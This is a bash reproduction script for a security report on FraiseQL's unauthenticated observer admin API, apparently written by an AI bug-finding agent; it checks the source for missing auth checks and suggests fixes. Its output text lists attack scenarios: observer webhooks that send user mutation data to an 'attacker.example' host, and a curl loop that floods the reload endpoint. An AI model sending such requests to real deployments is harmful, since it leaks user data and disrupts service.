#!/usr/bin/env bash
#
# observers.bug-6.sh — reproduction for FW-21 (the observer admin HTTP
# API — POST /api/observers, PATCH /{id}, DELETE /{id}, enable / disable,
# POST /runtime/reload, DLQ retry routes — accepts UNAUTHENTICATED
# requests; an anonymous caller can install observers, modify them,
# disable them, retry DLQ items, and trigger reloads).
#
# Filed: https://github.com/fraiseql/fraiseql/issues/<TBD>
# Registered: _internal/.plan/framework-qa-triage.md (FW-21)
#
# Persona: Bug-Finder (Opus 4.7), Phase 03 / Cycle 3 RED.
# Frozen FraiseQL SHA: d0a4ed4ec1770c70707f68fd9019f2b561d87461 (v2.3.2).
#
# ============================================================================
# Expected (per any reasonable read of "observer management" as a
# write-side admin surface — analogous to /admin/tenants, which Cycle 1
# RED confirmed is gated; analogous to /api/observers as documented at
# the v2.3 CHANGELOG entry):
#
#   The observer admin routes — every method that mutates `tb_observer`
#   or the runtime state — should require an authenticated identity
#   with `admin` (or equivalent) role. Read-only routes (GET) may also
#   require authentication, since they expose `tb_observer.actions`
#   JSONB which can contain secrets in `headers`.
#
# Actual (at frozen SHA,
# crates/fraiseql-server/src/observers/handlers.rs):
#
#   The mutating handlers use the `OptionalSecurityContext` extractor:
#
#       pub async fn create_observer(
#           State(state): State<ObserverState>,
#           OptionalSecurityContext(security_context): OptionalSecurityContext,
#           Json(request): Json<CreateObserverRequest>,
#       ) -> impl IntoResponse { ... }
#
#   `OptionalSecurityContext` returns `None` when no `AuthUser`
#   extension is present (crates/fraiseql-server/src/extractors.rs:
#   L65-L100). The handler then:
#
#       let customer_org: Option<i64> = extract_customer_org(security_context.as_ref());
#       let created_by: Option<&str> = extract_user_id(security_context.as_ref());
#       match state.repository.create(&request, customer_org, created_by).await { ... }
#
#   `extract_customer_org(None)` returns `None`. `extract_user_id(None)`
#   returns `None`. The repository.create proceeds — there is NO guard
#   that requires authentication. The observer is inserted with
#   `customer_org = NULL, created_by = NULL`.
#
#   The runtime-control handlers (reload_observers, get_runtime_health)
#   use `State<RuntimeHealthState>` only — no auth extractor at all.
#
#   The DLQ handlers (dlq_retry_handler, dlq_retry_all_handler,
#   dlq_list_handler, dlq_get_handler, delivery_health_handler) use
#   `State<DlqState>` only — no auth extractor.
#
# Consequence (security; critical):
#
#   Combined with FW-13 (runtime routes at root `/runtime/health`,
#   `/runtime/reload` — not nested under `/api/observers`), an
#   anonymous caller with network access to the binary can:
#
#   1. POST /api/observers — install an observer that fires on every
#      mutation of any entity type and POSTs the full event payload
#      to attacker-controlled `webhook_url` (exfil channel).
#   2. PATCH /api/observers/{id} — modify an existing observer's
#      webhook URL or headers (silent redirection of a legitimate
#      observer's traffic).
#   3. DELETE /api/observers/{id} — silently delete an observer.
#   4. POST /api/observers/{id}/disable — silently disable an
#      observer (delivery stops).
#   5. POST /runtime/reload — trigger arbitrary reloads (DoS against
#      DB pool + latency spike during in-flight dispatch).
#   6. POST /api/observers/dlq/retry-all — replay every DLQ item
#      against whatever the operator (or attacker) has configured
#      as the webhook URL.
#   7. GET /api/observers/{id} — read the actions JSONB including
#      any bearer-token secrets in the headers map.
#
#   This is the same class as FW-8 (storage presign bypasses RLS) —
#   a write-side endpoint that should require auth has no auth check.
#
# This script is a static-source reproduction. It asserts that NONE
# of the observer admin handlers use a required-auth extractor.
#
# Exit codes:
#   0  — bug NOT reproduced (RequireAuth added) — file follow-up.
#   1  — bug REPRODUCED (anonymous admin surface at frozen SHA).
# ============================================================================

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")"/.. && pwd)"
FRAISEQL_REPO="$(cd "$HERE"/../../../fraiseql && pwd)"
FRAISEQL_SHA="$(cat "$HERE/FRAISEQL_SHA")"

echo "================================================================"
echo "FW-21 reproduction — observer admin API has no auth gate"
echo "FraiseQL SHA: $FRAISEQL_SHA"
echo "================================================================"

if ! git -C "$FRAISEQL_REPO" cat-file -e "$FRAISEQL_SHA"; then
    echo "ERROR: frozen SHA $FRAISEQL_SHA not present in $FRAISEQL_REPO" >&2
    exit 2
fi

HANDLERS=$(git -C "$FRAISEQL_REPO" show "$FRAISEQL_SHA:crates/fraiseql-server/src/observers/handlers.rs")
DLQ=$(git -C "$FRAISEQL_REPO" show "$FRAISEQL_SHA:crates/fraiseql-server/src/observers/dlq_handlers/mod.rs")
ROUTES=$(git -C "$FRAISEQL_REPO" show "$FRAISEQL_SHA:crates/fraiseql-server/src/observers/routes.rs")

# (a) Mutating observer-admin handlers use OptionalSecurityContext or nothing.
echo
echo "Auth extractors on observer admin handlers (handlers.rs):"
for fn in create_observer update_observer delete_observer enable_observer disable_observer reload_observers; do
    sig=$(printf '%s\n' "$HANDLERS" | awk "/pub async fn ${fn}/,/{/" | head -10)
    auth=$(printf '%s\n' "$sig" | grep -oE "RequireAuth|RequireRole|RequireAdmin|OptionalSecurityContext|SecurityContext" || true)
    if [[ -z "$auth" ]]; then auth="(none)"; fi
    echo "  ${fn}: ${auth}"
done

# Count how many handlers use the required-auth extractor.
required_auth_count=$(printf '%s\n' "$HANDLERS" | grep -cE 'RequireAuth|RequireRole|RequireAdmin' || true)
echo
echo "Total RequireAuth/RequireRole/RequireAdmin extractors in observer admin handlers: $required_auth_count"

if [[ "$required_auth_count" -gt 0 ]]; then
    echo "BUG NOT REPRODUCED in expected shape: a required-auth extractor was found." >&2
    exit 0
fi

# (b) DLQ handlers have no auth extractor either.
echo
echo "Auth extractors on DLQ handlers (dlq_handlers/mod.rs):"
for fn in delivery_health_handler dlq_list_handler dlq_get_handler dlq_retry_handler dlq_retry_all_handler; do
    sig=$(printf '%s\n' "$DLQ" | awk "/pub async fn ${fn}/,/{/" | head -10)
    auth=$(printf '%s\n' "$sig" | grep -oE "RequireAuth|RequireRole|RequireAdmin|OptionalSecurityContext|SecurityContext" || true)
    if [[ -z "$auth" ]]; then auth="(none)"; fi
    echo "  ${fn}: ${auth}"
done

dlq_required_auth_count=$(printf '%s\n' "$DLQ" | grep -cE 'RequireAuth|RequireRole|RequireAdmin' || true)
if [[ "$dlq_required_auth_count" -gt 0 ]]; then
    echo "BUG NOT REPRODUCED in expected shape: DLQ handlers now require auth." >&2
    exit 0
fi

# (c) Router layer applies no auth middleware to the observer routes.
echo
echo "Router-level auth middleware on observer routers:"
mw_hits=$(printf '%s\n' "$ROUTES" | grep -nE "layer\(.*auth|require_auth|admin_middleware|RequireAuthLayer" || true)
if [[ -z "$mw_hits" ]]; then
    echo "  (no auth layer applied to observer_routes / observer_runtime_routes / observer_dlq_routes)"
else
    printf '%s\n' "$mw_hits"
fi

if [[ -n "$mw_hits" ]]; then
    echo "BUG NOT REPRODUCED in expected shape: router-level auth middleware present." >&2
    exit 0
fi

cat <<'MSG'

================================================================
Bug-shape assertion:
================================================================
- create_observer / update_observer / delete_observer / enable_observer
  / disable_observer all use OptionalSecurityContext — None on
  anonymous calls; create proceeds regardless.
- reload_observers, get_runtime_health, and ALL DLQ handlers use
  State<*State> only — no auth extractor at all.
- The router-level mounting in routes.rs and routing/observers.rs
  applies no auth layer to the observer route nests.

BUG REPRODUCED.

Attack scenarios (severity: critical):

  1. Exfil installation:
     POST /api/observers
       {"name":"exfil","entity_type":"User","event_type":"INSERT|UPDATE",
        "actions":[{"type":"webhook","url":"https://attacker.example/leak",
                    "headers":{}}]}
     → all User mutations are forwarded to the attacker domain.

  2. Silent re-routing:
     PATCH /api/observers/<existing-uuid>
       {"actions":[{"type":"webhook","url":"https://attacker.example/leak"}]}
     → an existing legitimate observer is silently redirected.

  3. Reload DoS:
     for i in {1..100}; do
       curl -X POST http://target/runtime/reload &
     done
     → 100 concurrent reload_observers calls hold the matcher /
       executor RwLocks under write contention; in-flight dispatch
       slows; observer DB pool exhausts.

  4. DLQ exfil replay:
     POST /api/observers/dlq/retry-all
     → every DLQ item is replayed against the currently-configured
       webhook URL — which the attacker may have just rewritten in
       step (2).

Note: the FW-13 mount path (/runtime/reload at the router ROOT, NOT
nested under /api/observers) makes this even more discoverable —
an attacker need not know the /api/observers prefix.

Suggested fix:
  1. Replace OptionalSecurityContext with a RequireAuth extractor on
     every write-side handler (create / update / delete / enable /
     disable / reload).
  2. Add a RequireAdmin (or RequireRole("observers:write")) gate.
  3. Read-side endpoints (list_observers, get_observer, dlq_list,
     dlq_get, delivery_health) should also require auth — the
     observer actions JSONB carries bearer-token secrets.
  4. At the router layer, apply an auth middleware layer to all
     three nests (observer_routes, observer_dlq_routes,
     observer_runtime_routes).

Affected page draft: /features/observers (security caveats),
/operations/observer-runbook (deployment guidance), /building/observers
(create observer flow).
Until fixed:
  - Page MUST warn that the observer admin API is unauthenticated and
    MUST NOT be exposed to the public internet.
  - Page MUST recommend reverse-proxy auth (mTLS or a bearer-token
    gate) in front of /api/observers, /api/observers/dlq,
    /runtime/health, /runtime/reload.
  - Page MUST cross-link FW-13 (route-mount inconsistency) since
    /runtime/* at root makes the path harder to gate.
MSG
exit 1
